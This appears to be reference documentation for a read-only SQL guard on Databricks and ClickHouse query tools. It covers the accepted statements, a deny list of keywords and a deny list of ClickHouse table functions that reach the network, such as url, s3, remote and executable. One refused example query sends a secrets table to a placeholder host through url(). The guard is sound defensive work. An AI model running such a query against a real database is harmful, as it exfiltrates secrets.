# FORBIDDEN_SQL — what a read-only query may contain

`databricks_query` and `clickhouse_query` refuse anything that could change
state, **before the statement leaves the process**. The check is not delegated
to a read-only credential or to the warehouse itself.

That is not caution for its own sake. A ClickHouse service running with
`readonly=2` — common, because it permits settings changes — refuses writes
while still executing `url()`, so a statement that passes every read-only check
can still send data to another host. Verified against ClickHouse 24.10; see
Design Log #5.

## Accepted

A single statement beginning with one of:

`SELECT` · `WITH` · `SHOW` · `DESCRIBE` / `DESC` · `EXPLAIN` · `VALUES` · `TABLE`

## Refused anywhere in the statement

`INSERT` `UPDATE` `DELETE` `DROP` `TRUNCATE` `ALTER` `CREATE` `MERGE` `REPLACE`
`GRANT` `REVOKE` `REFRESH` `RESTORE` `VACUUM` `OPTIMIZE` `COPY` `UPSERT` `SET`
`RESET` `USE` `CALL` `EXECUTE` `ANALYZE` `COMMENT` `MSCK` `CACHE` `UNCACHE`
`CLEAR`

Matching is on whole words, so a column named `created_at`, `update_time` or
`deleted_flag` is fine. The `details.forbiddenKeyword` field names whichever
keyword tripped the check.

## Also refused

**More than one statement.** `SELECT 1; DROP TABLE t` is rejected outright
rather than validated statement by statement. A semicolon inside a string
literal is data, not a separator, so `WHERE note = 'a;b'` is fine.

**Unterminated string literals or block comments.** Ambiguous input is refused
rather than guessed at.

Comments and string-literal contents are removed before the keyword scan, in a
single pass, so a verb cannot hide behind `--` and an apostrophe inside a
comment cannot open a literal.

## How to repair

| You wanted | Do this instead |
| --- | --- |
| To see a table's shape | `DESCRIBE TABLE catalog.schema.table` |
| To find the table name | `SHOW TABLES IN schema` |
| To check what a query will do | `EXPLAIN SELECT …` |
| Fewer rows back | Aggregate in SQL — `GROUP BY`, `count()` — rather than returning raw rows |
| To write data | Not available. This server is read-only everywhere, by design. |

## ClickHouse only: functions that reach outside the database

ClickHouse table functions run *inside* a `SELECT`, so no verb check can catch
them. These are refused wherever they appear:

`url` `file` `s3` `s3Cluster` `remote` `remoteSecure` `mysql` `postgresql`
`jdbc` `odbc` `hdfs` `azureBlobStorage` `deltaLake` `iceberg` `hudi`
`executable` `input` `sqlite` `mongodb` `redis` `gcs`

The refusal names the function in `details.forbiddenFunction`. A column, alias
or string literal that merely shares one of these names is unaffected, because
literal contents are blanked before the scan.

```sql
-- refused: reaches the network from inside a SELECT
SELECT * FROM url('http://elsewhere/?d=' || (SELECT k FROM secrets), 'CSV', 'x String')

-- accepted: url is a column here
SELECT url FROM requests WHERE note = 'fetched via url() once'
```

ClickHouse also refuses `WATCH`, which mutates nothing but never returns.

## Qualified names are identifiers

A forbidden verb appearing as part of a qualified name is a table, not a verb,
so these are accepted:

```sql
SELECT * FROM system.query_log          -- SYSTEM is the database here
SELECT * FROM catalog.merge_history     -- MERGE is part of the table name
```

## Environment

Both tools run against **dev** unless you pass `env: "prod"` explicitly. If a table
looks empty, check you are querying the environment that holds the data before
concluding the query is wrong.
